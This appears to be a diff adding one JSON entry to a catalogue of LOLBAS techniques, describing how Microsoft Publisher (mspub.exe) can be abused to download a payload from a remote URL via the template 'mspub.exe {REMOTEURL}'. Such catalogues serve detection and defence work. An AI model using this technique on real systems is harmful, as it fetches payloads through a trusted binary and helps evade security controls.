@@ -1,0 +1,23 @@
+{
+  "id": "lolbas-mspub-exe-download",
+  "name": "LOLBAS · Mspub.exe (Download)",
+  "command": "mspub.exe {REMOTEURL}",
+  "description": "Downloads payload from remote server",
+  "platform": "windows",
+  "tags": [
+    "lolbas",
+    "mspub",
+    "download"
+  ],
+  "source": "lolbas",
+  "source_url": "https://lolbas-project.github.io/lolbas/Mspub/",
+  "upstream_id": "Mspub.exe/Download/0",
+  "category": "lolbas",
+  "subcategory": "download",
+  "references": [
+    {
+      "title": "LOLBAS — Mspub.exe",
+      "url": "https://lolbas-project.github.io/lolbas/Mspub/"
+    }
+  ]
+}
